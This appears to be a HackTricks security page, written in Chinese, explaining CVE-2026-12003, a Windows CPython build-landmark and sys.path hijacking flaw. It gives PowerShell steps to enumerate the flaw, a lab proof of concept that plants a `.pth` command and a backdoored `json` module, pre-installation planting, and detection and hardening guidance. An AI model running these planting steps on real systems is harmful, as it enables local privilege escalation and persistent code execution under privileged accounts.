# Windows CPython Build-Landmark 和 `sys.path` Hijacking

{{#include ../../../banners/hacktricks-training.md}}

runtime 可能会保留原本仅用于其 build tree 的相对路径。如果已安装的高权限 runtime 将其中某个路径解析到低权限用户可写的目录，攻击者就可以植入预期的 **build landmark**，使 runtime 信任一个替代的 library prefix。CVE-2026-12003 是一个 Windows CPython 示例：植入 `Modules\Setup.local` 可以重定向 `sys.path` 中的 standard-library 条目，而无需修改受保护的 Python 安装目录。<sup>[[1]](#references)[[2]](#references)</sup>

## CPython path-construction chain

受影响的 Windows build 编译时使用了 `VPATH=..\..`，并将其暴露为 `sys._vpath`。`Modules/getpath.py` 中存在漏洞的 fallback 将 `VPATH\Modules\Setup.local` 视为解释器正在 source tree 中运行的证据；以下数据流将这个 build-time 值转化为 runtime search-path primitive。<sup>[[1]](#references)[[2]](#references)</sup>

| Stage | `C:\Program Files\Python314\python.exe` 的 Derived value |
| --- | --- |
| Compiled build path | `VPATH=..\..` |
| Runtime build landmark | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
| Attacker-created landmark | `C:\Modules\Setup.local` |
| Selected `build_prefix` | `C:\` |
| Selected standard library | `C:\Lib` |
| Result | 由攻击者控制的 `C:\Lib` 被追加到 `sys.path` |

当 executable 旁边不存在或无法读取更具体的 `pybuilddir.txt` 时，该检查会作为 fallback 使用。这一点很重要，因为低权限用户可能无法修改 `C:\Program Files\Python314`，但仍可能在 `C:\` 创建新目录。之后启动的高权限 `python.exe` 进程会使用其自身的 access token 加载 Python code。<sup>[[1]](#references)[[2]](#references)</sup>

### Preconditions

仅当以下所有条件均满足时，才应将其视为 privilege boundary：<sup>[[1]](#references)[[2]](#references)</sup>

- 目标是受影响的 **Windows CPython** build；易受攻击的 path logic 并非 Python-language 的属性。
- 从包含 `python.exe` 的目录解析 `..\..` 后得到的目录允许低权限用户创建该 landmark 以及 `Lib` tree。
- 更高权限的用户、service、installer 或 software-deployment account 之后会启动该 interpreter。
- 没有 path-isolation configuration 覆盖易受攻击的 discovery path。

## 枚举

检查 compiled value 和 effective search path。暴露的 `..\..` 值是一个有用的线索，但并不能证明具有 exploitability：还需要解析该 path、测试 ACL，并确认植入的 landmark 位于受保护 installation 之外。<sup>[[1]](#references)[[2]](#references)</sup>
```powershell
python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"

$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$prefix = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
$prefix
icacls $prefix
```
不要将评估范围限制在官方安装程序。对于任何捆绑 `python.exe` 的产品，都应将其 `sys._vpath` 相对于实际可执行文件目录进行解析，并检查最终 `Modules` 和 `Lib` 位置的 ACL。更深层的安装路径可能会解析到不同的可写应用程序或供应商目录，而不是 `C:\`。<sup>[[1]](#references)</sup>

## Lab exploitation workflow

以下 lab PoC 在选定前缀下方镜像出足够多的合法 runtime 内容，使 Python 能够完成初始化；随后添加一行可执行的 `.pth`，最后创建 landmark。应在创建 landmark 之前创建 payload，以避免解释器暂时指向不完整的 library tree。<sup>[[1]](#references)</sup>
```powershell
$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$root = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
robocopy /E "$pythonDir\Lib" "$root\Lib" | Out-Null
robocopy /E "$pythonDir\DLLs" "$root\Lib" | Out-Null
New-Item "$root\Lib\site-packages" -ItemType Directory -Force | Out-Null
'import subprocess;subprocess.run(["cmd.exe","/c","whoami > %TEMP%\\py-landmark.txt"],shell=False)' |
Set-Content "$root\Lib\site-packages\audit.pth" -Encoding Ascii
New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
```
在正常的网站初始化过程中，Python 会处理已识别 site-packages 目录中的 `.pth` 文件。只有以 `import` 开头且后跟空白字符的行才会被执行，并且可执行语句必须保持在同一个物理行中；`python -S` 会禁止自动导入 `site`，因此不会触发此机制。<sup>[[1]](#references)[[4]](#references)</sup>

### Import-triggered alternative

不要求在启动时执行。复现合法的 library tree 后，可以对特权脚本可预测导入的模块植入 backdoor。例如，向植入的 `Lib\json\__init__.py` 添加代码，当受害者导入 `json` 时就会执行；选择一个可靠但并非普遍会被导入的模块，可以让触发更加隐蔽。<sup>[[1]](#references)</sup>
```powershell
'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
```
此变体仍会继承导入进程的 token，但它依赖目标应用导入被修改的 module。在测试真实 software 时，应保留原始 module 的行为，否则 import 可能会在预期的 privileged workflow 完成前失败。<sup>[[1]](#references)</sup>

## Pre-installation planting

Search-path planting 可以发生在 installation 之前。低权限用户可以预先准备未来的 `Lib` tree 和 `Modules\Setup.local`，然后等待 privileged software portal、help-desk workflow 或 deployment system 执行 all-users installation。会启动新 interpreter 来安装 packages 或预编译 standard library 的 installers，可能会在 deployment account 下触发 payload，而无需 administrator 手动打开 Python。<sup>[[1]](#references)</sup>

这也改变了 deployment review：在安装或升级 bundled runtime **之前**，检查可写的 ancestors 以及预先存在的 landmark/library directories，而不是仅在 deployment 完成后检查最终 installation directory。<sup>[[1]](#references)</sup>

## Detection and hardening

有用的 host pivots 是异常的 landmark 和 library tree，随后是 privileged Python launch。查找 `Modules\Setup.local`、root-level 或其他位置异常的 `Lib\site-packages\*.pth`、复制的 standard-library packages，以及 owner 或 creation time 与受保护 installation 不同的 module files。将这些文件由 standard user 创建的时间，与 elevated `python.exe` 启动 `cmd.exe`、`powershell.exe`、account-management tools 或其他异常 children 的事件进行关联。<sup>[[1]](#references)</sup>
```powershell
Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib\site-packages -Filter *.pth -ErrorAction SilentlyContinue |
Select-Object FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
```
上游修复移除了 `VPATH\Modules\Setup.local` fallback，并使 `pybuilddir.txt` 成为唯一的 build-tree indicator。优先使用 fixed build，或使用当前 Python install manager 管理的 per-user installation。若暂时无法升级，请保护解析出的 ancestor，并使用 restrictive ACLs 预先创建 `Modules`；受控的 `._pth` 文件或 `PYTHONHOME` 也可以改变 discovery，但需要进行 application compatibility testing。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [Bishop Fox - CVE-2026-12003：Windows CPython Search-Path Hijacking 和 Local Privilege Escalation](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
- [2] [CPython issue #151544 - 无需修改 install directory 即可启用 in-tree search paths](https://github.com/python/cpython/issues/151544)
- [3] [CPython pull request #151545 - 移除 `VPATH/Modules/Setup.local` fallback](https://github.com/python/cpython/pull/151545)
- [4] [Python documentation - `site` path configuration files](https://docs.python.org/3/library/site.html)
{{#include ../../../banners/hacktricks-training.md}}
